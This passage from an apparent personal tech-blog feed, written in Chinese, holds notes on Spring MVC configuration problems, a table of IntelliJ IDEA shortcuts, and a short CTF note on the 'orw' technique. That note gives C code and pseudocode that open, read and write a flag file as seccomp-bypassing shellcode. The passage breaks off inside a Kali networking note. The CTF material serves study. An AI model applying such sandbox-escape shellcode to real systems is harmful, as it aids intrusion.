class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">       username:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       password:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       age:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"age"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h5 id="ModelMap"><a href="#ModelMap" class="headerlink" title="ModelMap"></a>ModelMap</h5><p>ModelMap对象主要用于传递控制方法处理数据到结果页面, 也就是说我们把结果页面上需要的数据放到ModelMap对象中 即可, 他的作用类似于request对象的setArrtibute方法,用来在一个请求过程中处理数据 </p><p>通过 </p><p>addAttribute(String ley, Object value) ;</p><p>向页面传递参数    </p><p>在页面上可以通过el变量方式$key 或者bboss的一系列数据展示标签获取并展示modelmap中的数据 </p><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h3 id="bean对象创建和加载顺序"><a href="#bean对象创建和加载顺序" class="headerlink" title="bean对象创建和加载顺序"></a>bean对象创建和加载顺序</h3><p>在实践bean中属性时，为了方便，将bean id更改，属性更改，类名不更改的情况，直接在同一个java文件内实现通过不同的bean id 获得有着不同属性的对象，并输出结果进行比较学习。发现后来通过getBean方法创建的bean对象反而先执行实现</p><p>通过更改参数，发现未定义参数返回空值的bean对象调用方法要提前执行  </p><p><img src="../images/java_web/image-20210404002003162.png" alt="image-20210404002003162"></p><p><img src="../images/java_web/image-20210404002008518.png" alt="image-20210404002008518"></p><p>上面为scope属性的单例范围实现</p><p>下面为原型范围实现</p><p>经过检验后发现 bean 中的scope属性颠倒 ，且重复调用了objSingle对象，重复为止在objPrototype.setMessage(“I’m a objProtype firt one”)；下</p><p>说明正常来说bean对象执行过程按照创建顺序执行 ，<code>写代码要更加细心</code></p><p>学习新的知识点，关于Spring容器加载和实例化bean的顺序</p><h4 id="关于Spring容器加载和实例化bean的顺序"><a href="#关于Spring容器加载和实例化bean的顺序" class="headerlink" title="关于Spring容器加载和实例化bean的顺序"></a>关于Spring容器加载和实例化bean的顺序</h4><p><a href="https://my.oschina.net/u/3387320/blog/2995935" target="_blank" rel="noopener">参考</a></p><p>Spring容器在实例化时会加载容器内所有非延迟加载的单例类型Bean。</p><p>ApplicationContext内置一个BeanFactory对象，作为实际的Bean工厂，和Bean相关业务都交给BeanFactory去处理。BeanFactory在加载一个BeanDefinition（也就是加载Bean Class）时，将相应的beanName存入beanDefinitionNames属性中，beanDefinitionName 属性是Spring在加载Bean Class生成的BeanDefinition时，为这些Bean预先定义好的名称，在加载完所有的BeanDefinition后，执行Bean实例化工作在BeanFactory实例化所有非延迟加载的单例Bean时，遍历beanDefinitionNames 集合，按顺序实例化指定名称的Bean，此时会依据beanDefinitionNames的顺序来有序实例化Bean，也就是说Spring容器内Bean的加载和实例化是有顺序的，而且近似一致，当然仅是近似。</p><p>加载bean过程</p><p>先看加载Bean Class过程，零配置下Spring Bean的加载起始于ConfigurationClassPostProcessor类的postProcessBeanDefinitionRegistry（BeanDefinitionRegistry）方法，<br>其加载解析Bean Class的流程如下：</p><p><img src="../images/java_web/9147bdc75798c2deb3f87d6c968142290e7.jpg" alt="img"></p><p>配置类</p><ol><li>Spring容器起始配置类</li><li>@ComponentScan扫描得到的类</li><li>@Import引入的类</li></ol><p>如果类上含有@Configuration， @Component ，@ComponentScan , @Import , @ImportResource注解中的一个，或者内部含有@Bean标识的方法，那么这个类就是一个配置类，Spring就会按照一定流畅去解析这个类上的信息，在解析的第一步会验证当前类是否已经被解析过了，如果是，那么按照一定规则处理(ComponeneScan得到的Bean能覆盖@Import得到的Bean，@Bean定义的优先级最高)</p><p>如果未解析过，那么开始解析：</p><p>1.解析内部类，查看内部类是否应该被定义成一个Bean，如果是，递归解析。<br>        2.解析@PropertySource，也就是解析被引入的Properties文件。<br>        3.解析配置类上是否有@ComponentScan注解，如果有则执行扫描动作，通过扫描得到的Bean Class会被立    即解析成BeanDefinition，添加进beanDefinitionNames属性中。之后查看扫描到的Bean Class是否是一个配置类（大部分情况是，因为标识@Component注解），如果是则递归解析这个Bean Class。<br>        4.解析@Import引入的类，如果这个类是一个配置类，则递归解析。<br>        5.解析@Bean标识的方法，此种形式定义的Bean Class不会被递归解析<br>        6.解析父类上的@ComponentScan，@Import，@Bean，父类不会被再次实例化，因为其子类能够做父类的工作，不需要额外的Bean了。</p><h3 id="Spring和SpringMVC扫描注解类冲突"><a href="#Spring和SpringMVC扫描注解类冲突" class="headerlink" title="Spring和SpringMVC扫描注解类冲突"></a>Spring和SpringMVC扫描注解类冲突</h3><p>因为在已经配置好了一个Beans.xml文件的项目工程下学习Spring的用法, 一直没有出现问题</p><p>所以在学习SpringMVC的时候直接在WEB-INF下创建springmvc-servlet.xml扫描注解类 </p><p>在 404报错页面中一直挣扎,包括修改tomcat配置和实验以前留下的servlet文件用来实验tomcat容器下的文件是否能正常配置</p><p>在最基础的一个mvc项目(输出hello SpringMVC)报错挣扎两三个小时</p><p>一直查找springMVC 404 进而修改 serlvlet.xml扫描注解文件</p><p>终于想到是不是因为存在两个Spring 类的xml文件而引起冲突  ,查找到@Controller 失效. 出现404错误</p><p>,因为WEB-INF文件夹下的jsp文件本来就不能在浏览器上直接访问(在解决上述404页面时学习到的新知识)     webapp目录下有着自动配置好的安全 配置  </p><p>最终解决,因为 创建的maven-web项目都添加了使得maven不自动加载maven插件,使得maven项目中不存在web 目录,需要手动创建, 后来重新建立 maven项目,并 加入maven-web moudle,出现webapp文件夹</p><p>并在此配置springmvc-servlet.xml文件  idea可以识别到此配置文件, 出现spring的标识符</p><p><img src="../images/java_web/image-20210406142508684.png" alt="image-20210406142508684"></p><p>同时 配置的 base-package 下的@Contoller 文件 会对应的有着spring的符号 </p><p><img src="../images/java_web/image-20210406142935810.png" alt="image-20210406142935810"></p><p><img src="../images/java_web/image-20210406142919387.png" alt="image-20210406142919387"></p><p>成功呢</p><h4 id="附上一些配置文件"><a href="#附上一些配置文件" class="headerlink" title="附上一些配置文件"></a>附上一些配置文件</h4><p> <img src="../images/java_web/image-20210406144724593.png" alt="image-20210406144724593"></p><p>Moudules中 Spring 中 Springmvc Servlet 为 springmvc-servlet.xml 文件的 配置名称</p><p>mvc 的配置文件 为  name-servlet .xml 形式 </p><p>文件结构</p><p><img src="../images/java_web/image-20210406145207661.png" alt="image-20210406145207661"></p><p>java 文件夹  和 webapp应该在同一分级</p><h3 id="springMVC"><a href="#springMVC" class="headerlink" title="springMVC"></a>springMVC</h3><p>中JSP页面EL表达式不起作用</p><p>${}</p><p>在使用 el 表达式的jsp中配置 </p><p>&lt;%@page isELIgonored=”false” %&gt;</p><p>该设置表达式在jsp中使用el表达式,可以解析其中的值, 若isELIgnored 设置为true , 代表在本页不使用el表达式, 当作字符串解析出来显示.  为flase时,el表达式正常工作, 显示正常 </p><p><code>isLIgnored  默认值为true! 所以才会出现这个问题</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/java_Security</title>
      <link href="java/java_Security/"/>
      <url>java/java_Security/</url>
      
        <content type="html"><![CDATA[<a id="more"></a>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java/idea</title>
      <link href="java/idea/"/>
      <url>java/idea/</url>
      
        <content type="html"><![CDATA[<h1 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h1><a id="more"></a><p>快捷键</p><h3 id="1-Ctrl"><a href="#1-Ctrl" class="headerlink" title="1.Ctrl"></a>1.Ctrl</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>Ctrl + F</td><td>在当前文件进行文本查找 （必备）</td></tr><tr><td>Ctrl + R</td><td>在当前文件进行文本替换 （必备）</td></tr><tr><td>Ctrl + Z</td><td>撤销 （必备）</td></tr><tr><td>Ctrl + Y</td><td>删除光标所在行 或 删除选中的行 （必备）</td></tr><tr><td>Ctrl + X</td><td>剪切光标所在行 或 剪切选择内容</td></tr><tr><td>Ctrl + C</td><td>复制光标所在行 或 复制选择内容</td></tr><tr><td>Ctrl + D</td><td>复制光标所在行 或 复制选择内容，并把复制内容插入光标位置下面 （必备）</td></tr><tr><td>Ctrl + W</td><td>递进式选择代码块。可选中光标所在的单词或段落，连续按会在原有选中的基础上再扩展选中范围 （必备）</td></tr><tr><td>Ctrl + E</td><td>显示最近打开的文件记录列表 （必备）</td></tr><tr><td>Ctrl + N</td><td>根据输入的 <strong>类名</strong> 查找类文件 （必备）</td></tr><tr><td>Ctrl + G</td><td>在当前文件跳转到指定行处</td></tr><tr><td>Ctrl + J</td><td>插入自定义动态代码模板 （必备）</td></tr><tr><td>Ctrl + P</td><td>方法参数提示显示 （必备）</td></tr><tr><td>Ctrl + Q</td><td>光标所在的变量 / 类名 / 方法名等上面（也可以在提示补充的时候按），显示文档内容</td></tr><tr><td>Ctrl + U</td><td>前往当前光标所在的方法的父类的方法 / 接口定义 （必备）</td></tr><tr><td>Ctrl + B</td><td>进入光标所在的方法/变量的接口或是定义处，等效于 Ctrl + 左键单击 （必备）</td></tr><tr><td>Ctrl + K</td><td>版本控制提交项目，需要此项目有加入到版本控制才可用</td></tr><tr><td>Ctrl + T</td><td>版本控制更新项目，需要此项目有加入到版本控制才可用</td></tr><tr><td>Ctrl + H</td><td>显示当前类的层次结构</td></tr><tr><td>Ctrl + O</td><td>选择可重写的方法</td></tr><tr><td>Ctrl + I</td><td>选择可继承的方法</td></tr><tr><td>Ctrl + +</td><td>展开代码</td></tr><tr><td>Ctrl + -</td><td>折叠代码</td></tr><tr><td>Ctrl + /</td><td>注释光标所在行代码，会根据当前不同文件类型使用不同的注释符号 （必备）</td></tr><tr><td>Ctrl + [</td><td>移动光标到当前所在代码的花括号开始位置</td></tr><tr><td>Ctrl + ]</td><td>移动光标到当前所在代码的花括号结束位置</td></tr><tr><td>Ctrl + F1</td><td>在光标所在的错误代码处显示错误信息 （必备）</td></tr><tr><td>Ctrl + F3</td><td>调转到所选中的词的下一个引用位置 （必备）</td></tr><tr><td>Ctrl + F4</td><td>关闭当前编辑文件</td></tr><tr><td>Ctrl + F8</td><td>在 Debug 模式下，设置光标当前行为断点，如果当前已经是断点则去掉断点</td></tr><tr><td>Ctrl + F9</td><td>执行 Make Project 操作</td></tr><tr><td>Ctrl + F11</td><td>选中文件 / 文件夹，使用助记符设定 / 取消书签 （必备）</td></tr><tr><td>Ctrl + F12</td><td>弹出当前文件结构层，可以在弹出的层上直接输入，进行筛选</td></tr><tr><td>Ctrl + Tab</td><td>编辑窗口切换，如果在切换的过程又加按上delete，则是关闭对应选中的窗口</td></tr><tr><td>Ctrl + End</td><td>跳到文件尾</td></tr><tr><td>Ctrl + Home</td><td>跳到文件头</td></tr><tr><td>Ctrl + Space</td><td>基础代码补全，默认在 Windows 系统上被输入法占用，需要进行修改，建议修改为 Ctrl + 逗号 （必备）</td></tr><tr><td>Ctrl + Delete</td><td>删除光标后面的单词或是中文句 （必备）</td></tr><tr><td>Ctrl + BackSpace</td><td>删除光标前面的单词或是中文句 （必备）</td></tr><tr><td>Ctrl + 1,2,3…9</td><td>定位到对应数值的书签位置 （必备）</td></tr><tr><td>Ctrl + 左键单击</td><td>在打开的文件标题上，弹出该文件路径 （必备）</td></tr><tr><td>Ctrl + 光标定位</td><td>按 Ctrl 不要松开，会显示光标所在的类信息摘要</td></tr><tr><td>Ctrl + 左方向键</td><td>光标跳转到当前单词 / 中文句的左侧开头位置 （必备）</td></tr><tr><td>Ctrl + 右方向键</td><td>光标跳转到当前单词 / 中文句的右侧开头位置 （必备）</td></tr><tr><td>Ctrl + 前方向键</td><td>等效于鼠标滚轮向前效果 （必备）</td></tr><tr><td>Ctrl + 后方向键</td><td>等效于鼠标滚轮向后效果 （必备）</td></tr></tbody></table><h3 id="2-Alt"><a href="#2-Alt" class="headerlink" title="2.Alt"></a>2.Alt</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>Alt + `|显示版本控制常用操作菜单弹出层 （必备）</td><td></td></tr><tr><td>Alt + Q</td><td>弹出一个提示，显示当前类的声明 / 上下文信息</td></tr><tr><td>Alt + F1</td><td>显示当前文件选择目标弹出层，弹出层中有很多目标可以进行选择 （必备）</td></tr><tr><td>Alt + F2</td><td>对于前面页面，显示各类浏览器打开目标选择弹出层</td></tr><tr><td>Alt + F3</td><td>选中文本，逐个往下查找相同文本，并高亮显示</td></tr><tr><td>Alt + F7</td><td>查找光标所在的方法 / 变量 / 类被调用的地方</td></tr><tr><td>Alt + F8</td><td>在 Debug 的状态下，选中对象，弹出可输入计算表达式调试框，查看该输入内容的调试结果</td></tr><tr><td>Alt + Home</td><td>定位 / 显示到当前文件的 Navigation Bar</td></tr><tr><td>Alt + Enter</td><td>IntelliJ IDEA 根据光标所在问题，提供快速修复选择，光标放在的位置不同提示的结果也不同 （必备）</td></tr><tr><td>Alt + Insert</td><td>代码自动生成，如生成对象的 set / get 方法，构造函数，toString() 等 （必备）</td></tr><tr><td>Alt + 左方向键</td><td>切换当前已打开的窗口中的子视图，比如Debug窗口中有Output、Debugger等子视图，用此快捷键就可以在子视图中切换 （必备）</td></tr><tr><td>Alt + 右方向键</td><td>按切换当前已打开的窗口中的子视图，比如Debug窗口中有Output、Debugger等子视图，用此快捷键就可以在子视图中切换 （必备）</td></tr><tr><td>Alt + 前方向键</td><td>当前光标跳转到当前文件的前一个方法名位置 （必备）</td></tr><tr><td>Alt + 后方向键</td><td>当前光标跳转到当前文件的后一个方法名位置 （必备）</td></tr><tr><td>Alt + 1,2,3…9</td><td>显示对应数值的选项卡，其中 1 是 Project 用得最多 （必备）</td></tr></tbody></table><h3 id="3-Shift"><a href="#3-Shift" class="headerlink" title="3.Shift"></a>3.Shift</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>Shift + F1</td><td>如果有外部文档可以连接外部文档</td></tr><tr><td>Shift + F2</td><td>跳转到上一个高亮错误 或 警告位置</td></tr><tr><td>Shift + F3</td><td>在查找模式下，查找匹配上一个</td></tr><tr><td>Shift + F4</td><td>对当前打开的文件，使用新Windows窗口打开，旧窗口保留</td></tr><tr><td>Shift + F6</td><td>对文件 / 文件夹 重命名</td></tr><tr><td>Shift + F7</td><td>在 Debug 模式下，智能步入。断点所在行上有多个方法调用，会弹出进入哪个方法</td></tr><tr><td>Shift + F8</td><td>在 Debug 模式下，跳出，表现出来的效果跟 F9 一样</td></tr><tr><td>Shift + F9</td><td>等效于点击工具栏的 Debug 按钮</td></tr><tr><td>Shift + F10</td><td>等效于点击工具栏的 Run 按钮</td></tr><tr><td>Shift + F11</td><td>弹出书签显示层 （必备）</td></tr><tr><td>Shift + Tab</td><td>取消缩进 （必备）</td></tr><tr><td>Shift + ESC</td><td>隐藏当前 或 最后一个激活的工具窗口</td></tr><tr><td>Shift + End</td><td>选中光标到当前行尾位置</td></tr><tr><td>Shift + Home</td><td>选中光标到当前行头位置</td></tr><tr><td>Shift + Enter</td><td>开始新一行。光标所在行下空出一行，光标定位到新行位置 （必备）</td></tr><tr><td>Shift + 左键单击</td><td>在打开的文件名上按此快捷键，可以关闭当前打开文件 （必备）</td></tr><tr><td>Shift + 滚轮前后滚动</td><td>当前文件的横向滚动轴滚动 （必备）</td></tr></tbody></table><h3 id="4-Ctrl-Alt"><a href="#4-Ctrl-Alt" class="headerlink" title="4.Ctrl + Alt"></a>4.Ctrl + Alt</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>Ctrl + Alt + L</td><td>格式化代码，可以对当前文件和整个包目录使用 （必备）</td></tr><tr><td>Ctrl + Alt + O</td><td>优化导入的类，可以对当前文件和整个包目录使用 （必备）</td></tr><tr><td>Ctrl + Alt + I</td><td>光标所在行 或 选中部分进行自动代码缩进，有点类似格式化</td></tr><tr><td>Ctrl + Alt + T</td><td>对选中的代码弹出环绕选项弹出层 （必备）</td></tr><tr><td>Ctrl + Alt + J</td><td>弹出模板选择窗口，将选定的代码加入动态模板中</td></tr><tr><td>Ctrl + Alt + H</td><td>调用层次</td></tr><tr><td>Ctrl + Alt + B</td><td>在某个调用的方法名上使用会跳到具体的实现处，可以跳过接口</td></tr><tr><td>Ctrl + Alt + C</td><td>重构-快速提取常量</td></tr><tr><td>Ctrl + Alt + F</td><td>重构-快速提取成员变量</td></tr><tr><td>Ctrl + Alt + V</td><td>重构-快速提取变量</td></tr><tr><td>Ctrl + Alt + Y</td><td>同步、刷新</td></tr><tr><td>Ctrl + Alt + S</td><td>打开 IntelliJ IDEA 系统设置 （必备）</td></tr><tr><td>Ctrl + Alt + F7</td><td>显示使用的地方。寻找被该类或是变量被调用的地方，用弹出框的方式找出来</td></tr><tr><td>Ctrl + Alt + F11</td><td>切换全屏模式</td></tr><tr><td>Ctrl + Alt + Enter</td><td>光标所在行上空出一行，光标定位到新行 （必备）</td></tr><tr><td>Ctrl + Alt + Home</td><td>弹出跟当前文件有关联的文件弹出层</td></tr><tr><td>Ctrl + Alt + Space</td><td>类名自动完成</td></tr><tr><td>Ctrl + Alt + 左方向键</td><td>退回到上一个操作的地方 （必备）</td></tr><tr><td>Ctrl + Alt + 右方向键</td><td>前进到上一个操作的地方 （必备）</td></tr><tr><td>Ctrl + Alt + 前方向键</td><td>在查找模式下，跳到上个查找的文件</td></tr><tr><td>Ctrl + Alt + 后方向键</td><td>在查找模式下，跳到下个查找的文件</td></tr><tr><td>Ctrl + Alt + 右括号（]）</td><td>在打开多个项目的情况下，切换下一个项目窗口</td></tr><tr><td>Ctrl + Alt + 左括号（[）</td><td>在打开多个项目的情况下，切换上一个项目窗口</td></tr></tbody></table><h3 id="5-Ctrl-Shift"><a href="#5-Ctrl-Shift" class="headerlink" title="5.Ctrl + Shift"></a>5.Ctrl + Shift</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>Ctrl + Shift + F</td><td>根据输入内容查找整个项目 或 指定目录内文件 （必备）</td></tr><tr><td>Ctrl + Shift + R</td><td>根据输入内容替换对应内容，范围为整个项目 或 指定目录内文件 （必备）</td></tr><tr><td>Ctrl + Shift + J</td><td>自动将下一行合并到当前行末尾 （必备）</td></tr><tr><td>Ctrl + Shift + Z</td><td>取消撤销 （必备）</td></tr><tr><td>Ctrl + Shift + W</td><td>递进式取消选择代码块。可选中光标所在的单词或段落，连续按会在原有选中的基础上再扩展取消选中范围 （必备）</td></tr><tr><td>Ctrl + Shift + N</td><td>通过文件名定位 / 打开文件 / 目录，打开目录需要在输入的内容后面多加一个正斜杠 （必备）</td></tr><tr><td>Ctrl + Shift + U</td><td>对选中的代码进行大 / 小写轮流转换 （必备）</td></tr><tr><td>Ctrl + Shift + T</td><td>对当前类生成单元测试类，如果已经存在的单元测试类则可以进行选择 （必备）</td></tr><tr><td>Ctrl + Shift + C</td><td>复制当前文件磁盘路径到剪贴板 （必备）</td></tr><tr><td>Ctrl + Shift + V</td><td>弹出缓存的最近拷贝的内容管理器弹出层</td></tr><tr><td>Ctrl + Shift + E</td><td>显示最近修改的文件列表的弹出层</td></tr><tr><td>Ctrl + Shift + H</td><td>显示方法层次结构</td></tr><tr><td>Ctrl + Shift + B</td><td>跳转到类型声明处 （必备）</td></tr><tr><td>Ctrl + Shift + I</td><td>快速查看光标所在的方法 或 类的定义</td></tr><tr><td>Ctrl + Shift + A</td><td>查找动作 / 设置</td></tr><tr><td>Ctrl + Shift + /</td><td>代码块注释 （必备）</td></tr><tr><td>Ctrl + Shift + [</td><td>选中从光标所在位置到它的顶部中括号位置 （必备）</td></tr><tr><td>Ctrl + Shift + ]</td><td>选中从光标所在位置到它的底部中括号位置 （必备）</td></tr><tr><td>Ctrl + Shift + +</td><td>展开所有代码 （必备）</td></tr><tr><td>Ctrl + Shift + -</td><td>折叠所有代码 （必备）</td></tr><tr><td>Ctrl + Shift + F7</td><td>高亮显示所有该选中文本，按Esc高亮消失 （必备）</td></tr><tr><td>Ctrl + Shift + F8</td><td>在 Debug 模式下，指定断点进入条件</td></tr><tr><td>Ctrl + Shift + F9</td><td>编译选中的文件 / 包 / Module</td></tr><tr><td>Ctrl + Shift + F12</td><td>编辑器最大化 （必备）</td></tr><tr><td>Ctrl + Shift + Space</td><td>智能代码提示</td></tr><tr><td>Ctrl + Shift + Enter</td><td>自动结束代码，行末自动添加分号 （必备）</td></tr><tr><td>Ctrl + Shift + Backspace</td><td>退回到上次修改的地方 （必备）</td></tr><tr><td>Ctrl + Shift + 1,2,3…9</td><td>快速添加指定数值的书签 （必备）</td></tr><tr><td>Ctrl + Shift + 左键单击</td><td>把光标放在某个类变量上，按此快捷键可以直接定位到该类中 （必备）</td></tr><tr><td>Ctrl + Shift + 左方向键</td><td>在代码文件上，光标跳转到当前单词 / 中文句的左侧开头位置，同时选中该单词 / 中文句 （必备）</td></tr><tr><td>Ctrl + Shift + 右方向键</td><td>在代码文件上，光标跳转到当前单词 / 中文句的右侧开头位置，同时选中该单词 / 中文句 （必备）</td></tr><tr><td>Ctrl + Shift + 前方向键</td><td>光标放在方法名上，将方法移动到上一个方法前面，调整方法排序 （必备）</td></tr><tr><td>Ctrl + Shift + 后方向键</td><td>光标放在方法名上，将方法移动到下一个方法前面，调整方法排序 （必备）</td></tr></tbody></table><h3 id="6-Alt-Shift"><a href="#6-Alt-Shift" class="headerlink" title="6.Alt + Shift"></a>6.Alt + Shift</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>Alt + Shift + N</td><td>选择 / 添加 task （必备）</td></tr><tr><td>Alt + Shift + F</td><td>显示添加到收藏夹弹出层 / 添加到收藏夹</td></tr><tr><td>Alt + Shift + C</td><td>查看最近操作项目的变化情况列表</td></tr><tr><td>Alt + Shift + I</td><td>查看项目当前文件</td></tr><tr><td>Alt + Shift + F7</td><td>在 Debug 模式下，下一步，进入当前方法体内，如果方法体还有方法，则会进入该内嵌的方法中，依此循环进入</td></tr><tr><td>Alt + Shift + F9</td><td>弹出 Debug 的可选择菜单</td></tr><tr><td>Alt + Shift + F10</td><td>弹出 Run 的可选择菜单</td></tr><tr><td>Alt + Shift + 左键双击</td><td>选择被双击的单词 / 中文句，按住不放，可以同时选择其他单词 / 中文句 （必备）</td></tr><tr><td>Alt + Shift + 前方向键</td><td>移动光标所在行向上移动 （必备）</td></tr><tr><td>Alt + Shift + 后方向键</td><td>移动光标所在行向下移动 （必备）</td></tr></tbody></table><h3 id="7-Ctrl-Shift-Alt"><a href="#7-Ctrl-Shift-Alt" class="headerlink" title="7.Ctrl + Shift + Alt"></a>7.Ctrl + Shift + Alt</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>Ctrl + Shift + Alt + V</td><td>无格式黏贴 （必备）</td></tr><tr><td>Ctrl + Shift + Alt + N</td><td>前往指定的变量 / 方法</td></tr><tr><td>Ctrl + Shift + Alt + S</td><td>打开当前项目设置 （必备）</td></tr><tr><td>Ctrl + Shift + Alt + C</td><td>复制参考信息</td></tr></tbody></table><h3 id="8-其他"><a href="#8-其他" class="headerlink" title="8.其他"></a>8.其他</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>介绍</strong></th></tr></thead><tbody><tr><td>F2</td><td>跳转到下一个高亮错误 或 警告位置 （必备）</td></tr><tr><td>F3</td><td>在查找模式下，定位到下一个匹配处</td></tr><tr><td>F4</td><td>编辑源 （必备）</td></tr><tr><td>F7</td><td>在 Debug 模式下，进入下一步，如果当前行断点是一个方法，则进入当前方法体内，如果该方法体还有方法，则不会进入该内嵌的方法中</td></tr><tr><td>F8</td><td>在 Debug 模式下，进入下一步，如果当前行断点是一个方法，则不进入当前方法体内</td></tr><tr><td>F9</td><td>在 Debug 模式下，恢复程序运行，但是如果该断点下面代码还有断点则停在下一个断点上</td></tr><tr><td>F11</td><td>添加书签 （必备）</td></tr><tr><td>F12</td><td>回到前一个工具窗口 （必备）</td></tr><tr><td>Tab</td><td>缩进 （必备）</td></tr><tr><td>ESC</td><td>从工具窗口进入代码文件窗口 （必备）</td></tr><tr><td>连按两次Shift</td><td>弹出 Search Everywhere 弹出层</td></tr></tbody></table><p>ctrl+shift+enter  Complete Current Statement </p><p>自动关闭并跳下一行</p><p>shift+enter 光标位置下重开一行</p><p>ctrl+shift+m 移动到光标位置</p><p>作者：tony关东升<br>链接：<a href="https://www.jianshu.com/p/c31a934080a3" target="_blank" rel="noopener">https://www.jianshu.com/p/c31a934080a3</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn/orw手法</title>
      <link href="pwn/orw%E6%89%8B%E6%B3%95/"/>
      <url>pwn/orw%E6%89%8B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><p>涉及到orw的题目一般为编写shellcode题目，体中会加入一些安全限制，比如<a href="https://blog.csdn.net/mashimiao/article/details/73607485" target="_blank" rel="noopener">seccomp</a>，linux下类似白名单，使进程进入到一种“安全”运行模式（沙箱）。该模式下进程智能调用四种系统调用（system calls） read(), write(), exit(), sigreturn(),否则程序便会被终止</p><a id="more"></a><p>简单的打开flag文件代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">"flag"</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">read</span>(fd,buf,<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>,buf,<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *file=<span class="string">"/home/orw/flag"</span></span><br><span class="line">sys_open(file,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">sys_read(<span class="number">3</span>,file,<span class="number">0x30</span>)</span><br><span class="line">sys_write(<span class="number">1</span>,file,<span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><p>转换为汇编代码后使用pwntools工具asm函数转为进制码</p><h3 id="linux函数调用号"><a href="#linux函数调用号" class="headerlink" title="linux函数调用号"></a>linux函数调用号</h3><p><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html" target="_blank" rel="noopener">https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html</a></p><p><a href="https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt" target="_blank" rel="noopener">seccomp官方文档</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn/kali_network</title>
      <link href="pwn/kali_network/"/>
      <url>pwn/kali_network/</url>
      
        <content type="html"><![CDATA[<h1 id="network-in-kali"><a href="#network-in-kali" class="headerlink" title="network in kali"></a>network in kali</h1><p>此例仅为我在kali中实验参考（版本不确定）</p><a id="more"></a><h2 id="连接网络"><a href="#连接网络" class="headerlink" title="连接网络"></a>连接网络</h2><p>基于虚拟机内kali 突然不能使用wifi，进行桥接模式得到网络</p><p><a href="https://blog.csdn.net/fzx_hsaj/article/details/87074056" target="_blank" rel="noopener">参考</a></p><h3 id="主要"><a href="#主要" class="headerlink" title="主要"></a>主要</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">route命令：</span><br><span class="line"></span><br><span class="line">route命令用于显示当前Linux系统中的路由信息，从route命令的显示结果可以看到当前主机所在的子网和默认网关的地址</span><br><span class="line"></span><br><span class="line">netstat命令</span><br><span 